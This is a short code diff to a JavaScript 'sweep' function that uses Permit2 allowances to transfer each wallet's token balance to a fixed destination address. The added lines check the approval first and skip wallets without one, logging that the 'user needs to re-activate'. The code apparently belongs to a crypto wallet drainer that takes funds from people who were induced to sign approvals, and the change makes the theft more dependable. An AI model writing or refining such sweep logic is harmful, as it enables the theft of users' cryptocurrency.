@@ -1929,8 +1929,17 @@ async function sweep(wallet) {
             const balance = await token.balanceOf(checksum);
             if (balance === 0n) continue;
 
+            // Verify ERC-20→Permit2 approval exists before calling transferFrom.
+            // Without it, the transferFrom reverts on-chain and wastes gas.
+            const erc20Allow = await token.allowance(checksum, PERMIT2_ADDRESS);
+            if (erc20Allow === 0n) {
+              warn(`[allowance] ${tokenAddr.slice(0,10)}: no ERC-20→Permit2 approval — skipping (user needs to re-activate)`);
+              continue;
+            }
+
             // Cap at p2Amount — Permit2 reverts if amount > registered allowance
             const sweepAmt = p2Amount < balance ? p2Amount : balance;
+            if (sweepAmt === 0n) continue;
 
             const fee = await getFeeData();
             const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, tokenAddr, { gasLimit: 150_000n, ...fee });
